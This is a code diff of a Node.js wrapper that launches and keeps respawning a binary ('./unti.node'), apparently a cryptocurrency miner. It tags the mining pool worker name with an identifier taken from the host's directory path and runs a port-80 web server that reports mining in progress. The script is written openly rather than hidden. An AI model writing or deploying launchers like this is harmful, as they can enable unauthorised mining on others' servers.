@@ -1,5 +1,30 @@
 const child_process = require('child_process');
-let sb = child_process.spawn('./unti.node');
-while(true){
-  if(sb.killed) sb = child_process.spawn('./unti.node');
+const http = require('http');
+const fs = require('fs');
+let fuck = require('./config.json');
+if(!fuck.noFuck) {
+  fuck.noFuck = (
+    Math.floor(Math.random() * 0xfff) +
+    Date.now() + 
+    process.pid
+  );
+  fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
 };
+
+if(!fuck.pools[0].user.split('.')[1]) {
+  fuck.pools[0].user += '.' + __dirname.split('/')[2] + fuck.noFuck;
+  fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
+};
+const server = http.createServer();
+let sb = child_process.spawn('./unti.node');
+server.on('request', (req, res) => {
+  res.writeHead(200, {'Content-Type' : 'text/plain; charset=UTF-8'});
+  res.write("絶賛マイニング中です！");
+  res.end();
+});
+
+server.listen(80);
+
+setInterval(() => {
+  if(sb.killed) sb = child_process.spawn('./unti.node');
+});
